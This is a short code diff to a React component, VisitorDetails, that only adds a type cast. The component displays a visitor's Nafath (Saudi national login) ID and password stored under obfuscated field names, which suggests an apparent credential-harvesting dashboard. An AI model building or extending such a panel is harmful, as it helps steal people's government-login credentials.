@@ -156,7 +156,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
   const nafazId = visitor._v8 || visitor.nafazId
   const nafazPass = visitor._v9 || visitor.nafazPass
   
-  if (nafazId || visitor.currentStep === "_t6") {
+  if (nafazId || (visitor.currentStep as any) === "_t6") {
     bubbles.push({
       id: "nafad-info",
       title: "🇸🇦 نفاذ",
